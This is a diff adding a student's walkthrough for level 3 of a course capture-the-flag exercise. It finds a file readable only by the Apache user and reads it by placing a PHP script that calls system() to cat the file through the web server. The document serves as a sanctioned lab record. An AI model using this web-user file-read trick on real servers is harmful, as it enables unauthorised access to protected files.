@@ -1,0 +1,35 @@
+#CS615-level3
+#The Matrix
+
+#result
+
+we ues the command `~jschauma/ctf/level3` and this is the result:
+```
+Welcome, User ID: 12249
+
+The passphrase for the next level can be found here:
+/home/jschauma/ctf
+```
+
+In this folder,there are two files `level3` and `?file`,so the answer is in the `?file`
+We use the inode to enter in the folder.`ls -ali` the result is 
+```
+63406 drwxr-xr-x  2 jschauma professor    3 May  2  2014 ?file
+```
+
+Then use `cd "$(find -inum 63406)"` to enter the folder.In this folder there are one file
+```
+63599 -r-------- 1 www-data www-data  27 May  2  2014 dir
+```
+We can't read it ,but the user and group is `www-data`.It is the default Apache web user/group,so we think we can use the web browser to visit it.
+
+Then we write a php script in the `~/cs_html/CS615/final`
+```
+<?php
+        system("cat \"$(find /home/jschauma/ctf -inum 63599)\" ");
+?>
+```
+open the url through web browser `https://www.cs.stevens.edu/~lliu19/CS615/final/ctf.php`
+
+The answer is::
+Octopuses have blue blood.
